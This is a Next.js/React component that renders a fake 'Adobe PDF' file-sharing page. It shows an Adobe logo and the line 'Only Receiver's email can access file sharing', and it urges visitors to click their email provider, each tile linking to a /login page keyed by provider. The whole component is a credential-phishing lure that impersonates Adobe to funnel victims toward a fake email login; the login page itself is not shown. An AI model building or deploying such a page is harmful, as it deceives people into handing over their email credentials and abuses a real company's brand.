import Link from "next/link";
import { theme } from "@/components/theme";
import Image from "next/image";

export default function Hero() {
  return (
    <section
      className="relative flex min-h-screen flex-col items-center bg-cover bg-center"
      style={{
        backgroundImage:
          "url('/bg.jpeg'), linear-gradient(135deg, #1e293b, #334155)",
      }}
    >

     
      {/* Darkening overlay so the boxes stay readable over any image */}
      <div className="absolute inset-0 bg-black/30" />

      <div className="relative z-10 flex flex-1 flex-col items-center justify-center pb-10 text-center text-white">
        <Image
         src="/adob.png" width={80} height={80} alt="adobe"/>
         <h1 className="text-3xl">Adobe PDF</h1>
         <p>Only Receiver&apos;s email can access file sharing</p>
         <p>SELECT AND CLICK ON YOUR EMAIL PROVIDER BELOW</p>
         <p><b>Example:(user@Yourdomain.com)</b></p>

         <br />
         <br />
         <br />


 <div className="relative z-10 mb-5 flex flex-wrap justify-center gap-4 px-4 sm:mb-16 sm:gap-6 sm:px-6">
        {theme.map((option) => (
          <Link
            key={option.text}
            href={`/login?box=${encodeURIComponent(option.text)}`}
            className={`flex flex-1 flex-col h-20 w-20 items-center justify-center rounded-lg ${option.buttonClassName} text-center text-xs font-medium text-zinc-800 shadow-lg transition hover:scale-105 hover:bg-white sm:h-28 sm:w-28 sm:text-sm`}
          >
            <Image src={option.image} width={30} height={30} alt="image" />
            <p> {option.text}</p>
           
          </Link>
        ))}
      </div>
 
        
      </div>

     
    </section>
  );
}
